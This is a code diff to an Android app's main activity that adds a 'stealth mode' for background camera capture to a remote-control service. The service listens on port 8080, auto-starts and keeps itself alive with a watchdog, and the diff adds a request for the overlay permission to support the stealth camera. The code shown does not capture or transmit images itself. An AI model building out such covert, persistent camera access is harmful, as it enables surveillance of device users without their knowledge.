@@ -3,9 +3,11 @@ package com.example.myapplication555;
 import android.Manifest;
 import android.app.ActivityManager;
 import android.content.Intent;
+import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -38,6 +40,7 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
     
     // Required permissions for remote control functionality
     // Note: Boot permission is automatically granted on install
+    // Note: SYSTEM_ALERT_WINDOW is handled separately
     private static final String[] REQUIRED_PERMISSIONS = {
             Manifest.permission.CAMERA,
             Manifest.permission.INTERNET,
@@ -112,13 +115,13 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
         
         // Show device IP address for remote connection
         String ipAddress = getDeviceIPAddress();
-        String message = "✅ Remote Control Started!\n\nDevice IP: " + ipAddress + ":8080\n\n🛡️ BULLETPROOF MODE: Watchdog monitoring active\n\nUse this IP in your Python control app.";
+        String message = "✅ Remote Control Started!\n\nDevice IP: " + ipAddress + ":8080\n\n🛡️ BULLETPROOF MODE: Watchdog monitoring active\n🎭 STEALTH MODE: Background camera capture enabled\n\nUse this IP in your Python control app.";
         
-        Snackbar.make(binding.getRoot(), "Remote Control Started - IP: " + ipAddress + ":8080 (Bulletproof)", 
+        Snackbar.make(binding.getRoot(), "Remote Control Started - IP: " + ipAddress + ":8080 (Bulletproof + Stealth)", 
                      Snackbar.LENGTH_LONG).show();
         
         Toast.makeText(this, message, Toast.LENGTH_LONG).show();
-        Log.i(TAG, "Remote control service started on IP: " + ipAddress + ":8080 with watchdog monitoring");
+        Log.i(TAG, "Remote control service started on IP: " + ipAddress + ":8080 with watchdog monitoring and stealth camera");
     }
 
     /**
@@ -141,7 +144,16 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
      * Check if all required permissions are granted
      */
     private boolean hasAllPermissions() {
-        return EasyPermissions.hasPermissions(this, REQUIRED_PERMISSIONS);
+        // Check regular permissions
+        boolean hasRegularPermissions = EasyPermissions.hasPermissions(this, REQUIRED_PERMISSIONS);
+        
+        // Check overlay permission separately (Android 6.0+)
+        boolean hasOverlayPermission = true;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            hasOverlayPermission = Settings.canDrawOverlays(this);
+        }
+        
+        return hasRegularPermissions && hasOverlayPermission;
     }
 
     /**
@@ -157,12 +169,39 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
      * Request all required permissions
      */
     private void requestPermissions() {
+        // Request regular permissions first
         EasyPermissions.requestPermissions(
                 this,
-                "This app needs camera and network permissions to work properly.",
+                "This app needs camera and network permissions for remote control functionality.",
                 REQUEST_CODE_PERMISSIONS,
                 REQUIRED_PERMISSIONS
         );
+        
+        // Request overlay permission separately (Android 6.0+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            requestOverlayPermission();
+        }
+    }
+
+    /**
+     * Request overlay permission for stealth camera functionality
+     */
+    private void requestOverlayPermission() {
+        Log.d(TAG, "Requesting overlay permission for stealth camera");
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            
+            Toast.makeText(this, "🎭 Please allow 'Display over other apps' for stealth camera mode", Toast.LENGTH_LONG).show();
+            
+            try {
+                startActivity(intent);
+            } catch (Exception e) {
+                Log.e(TAG, "Error opening overlay permission settings", e);
+                Toast.makeText(this, "Please manually enable 'Display over other apps' in Settings", Toast.LENGTH_LONG).show();
+            }
+        }
     }
 
     /**
@@ -190,13 +229,13 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
             
             // Show that service is already running
             String ipAddress = getDeviceIPAddress();
-            String message = "🤖 Remote Control Auto-Started!\n\nDevice IP: " + ipAddress + ":8080\n\n🛡️ BULLETPROOF MODE: Watchdog monitoring active\n\nTap button to STOP service.";
+            String message = "🤖 Remote Control Auto-Started!\n\nDevice IP: " + ipAddress + ":8080\n\n🛡️ BULLETPROOF MODE: Watchdog monitoring active\n🎭 STEALTH MODE: Background camera capture enabled\n\nTap button to STOP service.";
             
-            Snackbar.make(binding.getRoot(), "Remote Control Running - IP: " + ipAddress + ":8080 (Bulletproof)", 
+            Snackbar.make(binding.getRoot(), "Remote Control Running - IP: " + ipAddress + ":8080 (Bulletproof + Stealth)", 
                          Snackbar.LENGTH_LONG).show();
             
             Toast.makeText(this, message, Toast.LENGTH_LONG).show();
-            Log.i(TAG, "Remote control service detected running on IP: " + ipAddress + ":8080 with watchdog monitoring");
+            Log.i(TAG, "Remote control service detected running on IP: " + ipAddress + ":8080 with watchdog monitoring and stealth camera");
         }
     }
 
